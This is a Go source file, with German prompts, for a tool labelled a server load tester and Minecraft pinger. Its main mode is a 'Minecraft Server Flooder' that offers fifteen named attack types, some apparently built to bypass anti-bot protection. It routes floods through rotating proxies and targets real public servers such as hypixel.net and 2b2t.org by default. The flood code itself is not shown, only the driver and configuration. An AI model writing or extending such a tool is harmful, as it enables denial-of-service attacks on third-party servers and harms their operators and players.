package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	fmt.Println("SERVER LASTTEST & MINECRAFT PINGER")
	fmt.Println(strings.Repeat("=", 60))

	// Wähle Test-Modus
	testMode := selectTestMode()

	if testMode == "minecraft" {
		runMinecraftPinger()
		return
	}

	// Normaler Load-Test
	proxies, useRotating := configureProxies()

	targetServer, concurrency, rps, duration, err := getServerConfig()
	if err != nil {
		fmt.Printf("Fehler bei der Server-Konfiguration: %v\n", err)
		os.Exit(1)
	}

	tester, err := NewLoadTester(targetServer, concurrency, rps, duration)
	if err != nil {
		fmt.Printf("Fehler beim Erstellen des Load Testers: %v\n", err)
		os.Exit(1)
	}

	tester.useRotating = useRotating

	if len(proxies) > 0 {
		var addErrors []string
		for _, p := range proxies {
			err := tester.AddProxy(p.Protocol, p.Host, p.Port, p.Username, p.Password, "")
			if err != nil {
				addErrors = append(addErrors, fmt.Sprintf("Proxy %s:%s - %v", p.Host, p.Port, err))
			}
		}

		if len(addErrors) > 0 {
			fmt.Println("Proxy-Fehler:")
			for _, errMsg := range addErrors {
				fmt.Printf("  - %s\n", errMsg)
			}
		}

		if len(tester.proxies) == 0 {
			fmt.Println("Keine gültigen Proxys verfügbar - verwende direkte Verbindung")
		}
	}

	fmt.Println("\n" + strings.Repeat("=", 60))
	tester.Start()
}

func selectTestMode() string {
	fmt.Println("TEST MODUS AUSWAHL")
	fmt.Println(strings.Repeat("=", 30))
	fmt.Println("1. Normaler Load-Test")
	fmt.Println("2. Minecraft Server Flooder")

	choice := promptUser("Wähle Modus (1-2) [1]: ")

	switch choice {
	case "2":
		return "minecraft"
	default:
		return "loadtest"
	}
}

func runMinecraftPinger() {
	fmt.Println("\nMINECRAFT SERVER FLOODER")
	fmt.Println(strings.Repeat("=", 50))

	// Proxy-Konfiguration
	proxies, useRotating := configureProxies()

	// Server-Liste konfigurieren
	servers := configureMinecraftServers()
	if len(servers) == 0 {
		fmt.Println("Keine Server konfiguriert")
		return
	}

	// Flood-Typ auswählen
	floodType := selectFloodType()

	// Worker-Anzahl
	concurrencyStr := promptUser("Anzahl Worker [10]: ")
	concurrency := 10
	if concurrencyStr != "" {
		if c, err := strconv.Atoi(concurrencyStr); err == nil && c > 0 {
			concurrency = c
		}
	}

	// Floods pro Sekunde
	rpsStr := promptUser("Floods pro Sekunde [50]: ")
	rps := 50
	if rpsStr != "" {
		if r, err := strconv.Atoi(rpsStr); err == nil && r > 0 {
			rps = r
		}
	}

	// Testdauer
	durationStr := promptUser("Testdauer in Sekunden [30]: ")
	duration := 30 * time.Second
	if durationStr != "" {
		if d, err := strconv.Atoi(durationStr); err == nil && d > 0 {
			duration = time.Duration(d) * time.Second
		}
	}

	fmt.Printf("\nStarte Minecraft Server Flooder...\n")
	fmt.Printf("Server: %d, Worker: %d, Floods/s: %d, Dauer: %v, Typ: %s\n",
		len(servers), concurrency, rps, duration, floodType)
	fmt.Printf("Proxys: %d (Rotation: %v)\n", len(proxies), useRotating)
	fmt.Println(strings.Repeat("=", 60))

	// Minecraft-Flooder erstellen
	flooder := NewMinecraftFlooder(servers, proxies, useRotating, concurrency, rps, duration, floodType)
	flooder.Start()
}

func selectFloodType() string {
	fmt.Println("\nFLOOD-TYP AUSWAHL")
	fmt.Println(strings.Repeat("-", 30))
	fmt.Println("1. ultrajoin - Ultra Join Attack")
	fmt.Println("2. multikiller - Multi Protocol Attack")
	fmt.Println("3. fakejoin - Fake Join Attack")
	fmt.Println("4. motdkiller - MOTD Killer")
	fmt.Println("5. cpulagger - CPU Lag Attack")
	fmt.Println("6. botfucker - Bot Attack")
	fmt.Println("7. joinbots - Join Bot Spam")
	fmt.Println("8. fastjoin - Fast Join Attack")
	fmt.Println("9. destroyer - Destroyer Attack")
	fmt.Println("10. aegiskiller - Aegis Killer")
	fmt.Println("11. 2lsbypass - 2LS Bypass")
	fmt.Println("12. cpuRipper - CPU Ripper")
	fmt.Println("13. byte - Byte Attack")
	fmt.Println("14. flood - Standard Flood")
	fmt.Println("15. legacy_motd - Legacy MOTD")

	floodTypes := map[string]string{
		"1":  "ultrajoin",
		"2":  "multikiller",
		"3":  "fakejoin",
		"4":  "motdkiller",
		"5":  "cpulagger",
		"6":  "botfucker",
		"7":  "joinbots",
		"8":  "fastjoin",
		"9":  "destroyer",
		"10": "aegiskiller",
		"11": "2lsbypass",
		"12": "cpuRipper",
		"13": "byte",
		"14": "flood",
		"15": "legacy_motd",
	}

	choice := promptUser("Wähle Flood-Typ (1-15) [1]: ")
	if choice == "" {
		choice = "1"
	}

	if floodType, exists := floodTypes[choice]; exists {
		return floodType
	}

	return "ultrajoin"
}

func configureMinecraftServers() []string {
	fmt.Println("\nSERVER KONFIGURATION")
	fmt.Println(strings.Repeat("-", 30))
	fmt.Println("1. Standard Server verwenden")
	fmt.Println("2. Eigene Server eingeben")

	choice := promptUser("Wähle Option (1-2) [1]: ")

	if choice == "2" {
		var servers []string
		fmt.Println("\nGib Minecraft Server ein (Format: host:port oder nur host)")
		fmt.Println("Leere Zeile zum Beenden:")

		for {
			server := promptUser(fmt.Sprintf("Server #%d: ", len(servers)+1))
			if server == "" {
				break
			}
			servers = append(servers, server)
		}

		return servers
	}

	// Standard Server
	return []string{
		"hypixel.net",
		"mc.hypixel.net",
		"2b2t.org",
		"mineplex.com",
		"gommehd.net",
		"cubecraft.net",
	}
}
